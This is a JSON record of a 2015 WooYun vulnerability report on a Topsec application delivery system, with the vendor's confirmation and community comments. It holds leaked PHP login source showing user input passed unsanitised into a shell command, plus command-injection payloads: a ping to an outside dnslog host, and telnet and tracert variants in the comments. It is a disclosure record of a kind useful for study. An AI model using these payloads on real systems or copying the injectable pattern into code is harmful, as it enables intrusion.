{"id": 37447, "wybug_id": "wooyun-2015-0105415", "wybug_title": "天融信应用交付系统源码泄漏+用cloudeye神器秒杀命令执行", "wybug_corp": "天融信", "wybug_author": "Alen", "wybug_date": "2015-04-02 18:46", "wybug_open_date": "2015-05-24 18:08", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向公众公开  简要描述： 天融信应用交付系统源码泄漏天融信1995年成立，总部设在北京。作为中国信息安全行业领导企业，多年来天融信人凭借着高度民族使命感和责任感，秉承“融天下英才、筑可信网络”的人才理念，成功打造出中国信息安全产业领先品牌TOPSEC。 详细说明：  \nhttp://mail.topsec.com.cn:8888/login.php. http://mail.topsec.com.cn:8888/login_check.php. http://mail.topsec.com.cn:8888/logout.php. http://mail.topsec.com.cn:8888/redirect.php.\n\n<?phpinclude_once dirname(__FILE__).\"/acc/common/uiResources.inc\";require_once dirname(__FILE__).\"/acc/common/config/item/configItem.inc\";require_once dirname(__FILE__).\"/acc/common/constant.inc\";$error = $_REQUEST['error'];?><!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\"><HTML xmlns=\"http://www.w3.org/1999/xhtml\"><HEAD><META http-equiv=Content-Type content=\"text/html; charset=utf-8\"><TITLE><?php echo PRODUCT_NAME_STRING?></TITLE><meta http-equiv=\"pragram\" content=\"no-cache\"><meta http-equiv=\"expires\" content=\"0\"><STYLE type=text/css>BODY {\tMARGIN: 0px;\tbackground-color: #ffffff;}input.SmallButtonStyle{\tcolor: #FFFFFF;\tbackground:#017BC4;\tfont:bold 14px Arial;\twidth: 70px;\theight:30px;\tborder-width :3px;\tborder-style:ridge;\tborder-color:#CCCCCC;\tvertical-align:middle;\ttext-align:center;\tcursor: pointer;}.style10 {\tfont-size: 13px;\tcolor: #FFFFFF;}</STYLE><LINK href=\"css/css.css\" type=text/css rel=stylesheet><META content=\"MSHTML 6.00.2900.3314\" name=GENERATOR><script language=\"javascript\" src=\"js/prototype.js\"></script><script>\tfunction go(){\t\tnew Ajax.Request($('loginForm').action, {\t\t\tparameters: \"userName=\" + $F('userName') + \"&password=\" + $F('pwd'),\t\t\tonSuccess:function(r){\t\t\talert(r.responseText);\t\t\t\tvar d = r.responseText.evalJSON(true);\t\t\t\tvar str = $F('err' + d.code);\t\t\t\tif(d.code == 0){\t\t\t\t\tif(confirm(d.user + str)){\t\t\t\t\t\twindow.location = 'redirect.php';\t\t\t\t\t}else{\t\t\t\t\t\twindow.location = 'logout.php';\t\t\t\t\t}\t\t\t\t}else if(d.code == 1){\t\t\t\t\talert(str);\t\t\t\t}else{\t\t\t\t\twindow.location = 'redirect.php';\t\t\t\t}\t\t\t}\t\t});\t}\tEvent.observe(window, 'load', function(){\t\t$('userName').focus();\t\t<?php if(isset($error)){?>\t\t\talert($F('err1'));\t\t<?php }?>\t});</script><style type=\"text/css\"><!--.style11 {color: #017BC4}--></style></HEAD><BODY><span class=\"style11\"></span><input type=\"hidden\" id=\"err0\" value=\"<?php echo LOGIN_INTERRUPT?>\"/><input type=\"hidden\" id=\"err1\" value=\"<?php echo LOGIN_ERROR_STRING?>\"/><input type=\"hidden\" id=\"err2\" value=\"\"/><table width=\"100%\" height=\"90%\">\t<tr align=\"center\">\t  <td height=\"360\">\t\t\t<table width=\"460\" height=\"275\" background=\"images/login-background.jpg\">\t\t\t\t<tr>\t\t\t\t  <td width=\"44\" height=\"90\" align=\"center\">&nbsp;</td>\t\t\t\t  <td width=\"181\" height=\"90\" align=\"center\"></td>\t\t\t      <td width=\"219\" vAlign=\"bottom\"  align=\"right\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>\t\t\t  </tr>\t\t\t\t<tr>\t\t\t\t  <td height=\"22\" align=\"center\">&nbsp;</td>\t\t\t\t  <td height=\"22\" align=\"center\">&nbsp;</td>\t\t          <TD ><!-- #EndLibraryItem --></TD>\t\t\t  </tr>\t\t\t\t<tr>\t\t\t\t  <td height=\"38\" align=\"center\">&nbsp;</td>\t\t\t\t  <td height=\"38\" colspan=\"2\" align=\"center\">\t\t\t\t  <CENTER>\t\t\t\t  <FORM action=\"login_check.php\" id=\"loginForm\" method=post><TABLE border=0>  <TBODY>  <TR align=middle>    <TD width=\"97\" align=\"right\"><strong><?php echo INDEX_USERNAME_STRING ?>:</strong></TD>    <TD width=\"230\"><INPUT style=\"width:200px;\"  id=userName size=28 name='userName'></TD>    </TR>  <TR align=middle>    <TD align=\"right\"><strong><?php echo INDEX_PASSWORD_STRING ?>:</strong></TD>    <TD><INPUT style=\"width:200px; \" id=\"pwd\" type=password size=28 name='password'></TD>    </TR>  <TR align=middle>    <TD height=\"44\"   colspan=\"1\">\t</TD>    <TD align=\"left\"><INPUT type='image'  src='<?php echo LOGIN_IMAGE ?>' align=\"top\"  value=\"aaaa\" ></INPUT></TD>    </TR></TBODY></TABLE></FORM></CENTER></td>\t\t      </tr>\t\t\t\t<tr>\t\t\t\t  <td height=\"27\" align=\"center\">&nbsp;</td>\t\t\t\t  <td height=\"27\" align=\"center\">&nbsp;</td>\t\t\t      <td align=\"center\">&nbsp;</td>\t\t\t  </tr>\t    </table>\t  </td>\t</tr></table><TABLE cellSpacing=0 cellPadding=0 width=1024 border=0>  <TBODY>  <TR>    <TD align=middle height=46><span class=\"style10\">&copy;</span><FONT      color=white><B>      <?php        echo PAGE_COPYRIGHT_STRING;      ?>      &nbsp;</B></FONT></TD></TR></TBODY></TABLE></BODY></HTML>\n\n<?php \trequire_once dirname ( __FILE__ ) . '/acc/common/log/LogUtil.inc';\t\tsession_start();\t/*\t$remoteIp = $_SERVER['REMOTE_ADDR'];    file_put_contents(\"/tmp/loginIp\", $remoteIp);    $user = $_SESSION['userInfo'];    syslog(LOG_INFO, \"$user login from $remoteIp\");    */\tlogger('auth', 'User Auth', LOG_ACTION_LOGIN);\theader(\"Location:/\");?>\n\n<?php\trequire_once dirname ( __FILE__ ) . '/acc/common/log/LogUtil.inc';\tsession_start();\tlogger('auth', 'User Auth', LOG_ACTION_LOGOUT);\t$remote = $_SERVER['REMOTE_ADDR'];// . ':' . $_SERVER['REMOTE_PORT'];\t$line = file_get_contents('/tmp/loginIp');\t\tif($remote == $line)    \tfile_put_contents(\"/tmp/loginIp\", '');    $user = $_SESSION['userInfo'];\tsyslog(LOG_INFO, \"$user logout from $remoteIp\");\t$_SESSION = array();\tif (isset($_COOKIE[session_name()])) {\t    setcookie(session_name(), '', time()-42000, '/');\t}\tsession_destroy();\theader(\"Location:/\");?>\n\n<?phprequire_once dirname ( __FILE__ ) . \"/acc/common/uiResources.inc\";require_once dirname ( __FILE__ ) . \"/acc/common/userManager.inc\";require_once dirname ( __FILE__ ) . '/acc/common/commandWrapper.inc';    session_start();    $userManager = new UserManager();    $userName = \"\";\t$password = \"\";    if(isset($_REQUEST[\"userName\"])){\t\t$userName = $_REQUEST[\"userName\"];\t\t$password = $_REQUEST[\"password\"];    \t    }      if($userManager->certificateUser($userName,$password)){\t    header(\"location: redirect.php\");    }else{    \theader(\"location: login.php?error=1\");    }?>\n\n\n\n\n太复杂了，看代码不爽，直接黑盒搞个命令执行看看\n; ping 333d61.dnslog.info; echo\n\n\n\n\n   漏洞证明：  \ncurl 'http://mail.topsec.com.cn:888login_check.php.'<?phprequire_once dirname ( __FILE__ ) . \"/acc/common/uiResources.inc\";require_once dirname ( __FILE__ ) . \"/acc/common/userManager.inc\";require_once dirname ( __FILE__ ) . '/acc/common/commandWrapper.inc';    session_start();    $userManager = new UserManager();    $userName = \"\";\t$password = \"\";    if(isset($_REQUEST[\"userName\"])){\t\t$userName = $_REQUEST[\"userName\"];\t\t$password = $_REQUEST[\"password\"];    \t    }      if($userManager->certificateUser($userName,$password)){\t    header(\"location: redirect.php\");    }else{    \theader(\"location: login.php?error=1\");    }?>\n\npublic function certificateUser($user,$pass){        $logined = false;                //if(strcasecmp($user,\"admin\")!=0){        //    return false;        //}\t\t        $validateUserPassFormat= APPEX_CMD_LOC.'ckpwd %s %s';        $command = sprintf($validateUserPassFormat,$user,$pass);        $result = execute($command);        $status = $result->get('retValue');        if($status ==0){            $_SESSION['userInfo']=$user;            $userDao = new UserDao();\t\t\t$user = $userDao->getUserFromUserName($user);\t\t\t$_SESSION['userType']=$user->getUserType();            $logined = true;        }        return $logined;    }\n   修复方案：     版权声明：转载请注明来源 Alen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-09 18:07 厂商回复： 感谢您的漏洞报送，产品问题正在修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-02 18:54 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  洞主有没有吃了一斤    \n     2015-04-02 18:56 |    \t\tAlen \t\t\t( 实习白帽子  |\t\t\t        Rank:86 漏洞数:21        | 精华漏洞数:10 | WooYun认证√ Duang)\t\t \n  @浩天 大神 666    \n     2015-04-02 18:57 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  不是我    \n     2015-04-02 19:02 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Alen 666啥意思？    \n     2015-04-02 19:07 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  描述怎么像打广告～    \n     2015-04-02 19:18 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  太凶了。我也要买神器。    \n     2015-04-02 19:22 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  买买买！    \n     2015-04-02 19:30 |    \t\t毛猴 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:18        | 一 只 怀 有 梦 想 的 猴 ......)\t\t \n  天融信看这里！！！！！！！！！！天融信看这里！！！！！！！！！！天融信看这里！！！！！！！！！！天融信看这里！！！！！！！！！！天融信看这里！！！！！！！！！！    \n     2015-04-02 20:00 |    \t\tAlen \t\t\t( 实习白帽子  |\t\t\t        Rank:86 漏洞数:21        | 精华漏洞数:10 | WooYun认证√ Duang)\t\t \n  @疯狗 牛牛牛    \n     2015-04-02 20:20 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  这是睡了几晚换来的广告···    \n     2015-04-02 20:26 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:26        | 他们回来了................)\t\t \n  我累个大槽    \n     2015-04-02 20:26 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  强势插入前排mark    \n     2015-04-02 23:06 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:30        | Wow~~~哈哈~~~)\t\t \n  牛逼！坐等细节    \n     2015-04-02 23:21 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  666    \n     2015-04-03 11:39 |    \t\t开心一下1313 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:20        | 喝口水,压压惊......)\t\t \n  牛掰啊！    \n     2015-04-03 11:47 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  期待    \n     2015-05-01 10:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个给力了    \n     2015-05-24 20:41 |    \t\t❤ \t\t\t( 普通白帽子  |\t\t\t        Rank:276 漏洞数:69        | ❤)\t\t \n  原来可以这样的    \n     2015-05-24 20:50 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  不选通用型亏大了    \n     2015-05-25 01:31 |    \t\t小2b \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 努力赚钱)\t\t \n  前排出黄瓜，瓜子，西瓜，东瓜，南瓜，还有傻瓜    \n     2015-05-25 22:31 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  @Alen  请问除了; ping 333d61.dnslog.info; echo这种，还有啥姿势？    \n     2015-08-11 14:58 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  还有 telnet www.baidu.com;echo     tracert www.1.com;echo    \n     2015-08-11 14:58 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  @qhwlpg 还有 telnet www.baidu.com;echo tracert www.1.com;echo    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}